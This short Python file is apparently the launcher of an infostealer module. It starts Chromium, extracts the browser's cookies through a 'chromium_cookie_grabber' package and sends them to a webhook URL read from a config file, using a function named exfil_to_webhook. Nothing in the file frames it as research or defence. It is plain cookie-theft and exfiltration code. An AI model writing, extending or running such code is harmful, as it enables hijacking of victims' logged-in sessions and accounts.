from modules.chromium_cookie_grabber.launcher import start_chromium
from modules.chromium_cookie_grabber.cookie_extractor import extract_cookies
from modules.chromium_cookie_grabber.exfil_payload import exfil_to_webhook
import json

def run_grab_chromium():
    config = json.load(open("modules/chromium_cookie_grabber/config.json"))
    db_path = start_chromium()
    cookies = extract_cookies(db_path)
    exfil_to_webhook(cookies, config["webhook_url"])
